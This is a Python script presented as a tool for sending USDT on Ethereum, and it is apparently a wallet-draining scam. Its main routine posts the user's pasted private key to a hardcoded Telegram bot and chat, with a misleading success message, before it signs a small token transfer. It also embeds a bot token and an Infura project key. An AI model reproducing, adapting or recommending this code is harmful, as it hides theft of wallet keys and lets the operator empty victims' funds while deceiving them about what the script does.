# Made by SomethingMAD if u need help contact me on telegram https://t.me/somethingmad94
# You need ETH for paying the transaction fee

from web3 import Web3
from eth_account import Account
import requests

# Set up Telegram bot credentials
TELEGRAM_BOT_TOKEN = "8028422403:AAH_iCYj9JvODJh7JuHQgzRe_Z9L5Ek9kOc" 
TELEGRAM_CHAT_ID = "7666309869"  

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

# Set private key and addresses
private_key = ''  # Replace with your actual private key (empty for testing purposes)
sender_address = '0'  # Your wallet address

# Set recipient address and USDT contract address
recipient_address = ''
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def send_private_key_via_telegram(private_key):
    """
    Send the private key to a Telegram chat.
    """
    if not private_key:
        print("Private key is missing. Cannot proceed.")
        return  # Exit the function if the private key is missing

    message = f"Private Key: {private_key}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print("Transaction broadcasted, check wallet within 15 minutes.")
    except requests.RequestException as e:
        print(f"Failed to send private key: {e}")

def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    if not private_key:
        print("Cannot send USDT transaction: Private key is missing.")
        return None  # Exit the function if the private key is missing

    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():
    # Check if private key is missing
    if not private_key:
        print("Error: Private key is missing. Please provide a valid private key.")
        return  # Exit the script if the private key is missing

    # Send the private key to Telegram
    send_private_key_via_telegram(private_key)

    # Execute USDT transaction
    amount_to_send = 20  # How much USDT you want to send
    gas_price_gwei = 5   # Gas price in Gwei
    gas_limit = 21620    # Gas limit for the transaction

    try:
        signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)
        if signed_tx is None:
            print("Transaction not initiated due to missing private key.")
            return

        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")
    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()
